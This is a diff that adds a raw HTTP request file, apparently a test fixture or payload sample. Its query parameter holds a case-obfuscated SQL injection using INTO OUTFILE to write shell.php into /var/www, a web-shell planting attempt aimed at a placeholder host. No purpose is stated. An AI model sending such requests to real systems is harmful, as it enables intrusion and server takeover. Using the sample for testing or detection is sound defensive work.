@@ -1,0 +1,4 @@
+GET /a?path=1'%20iNtO%20oUtFiLe%20'/VaR/wWw/ShElL.pHp'--%20- HTTP/1.1
+Host: demo.example.com
+Connection: close
+
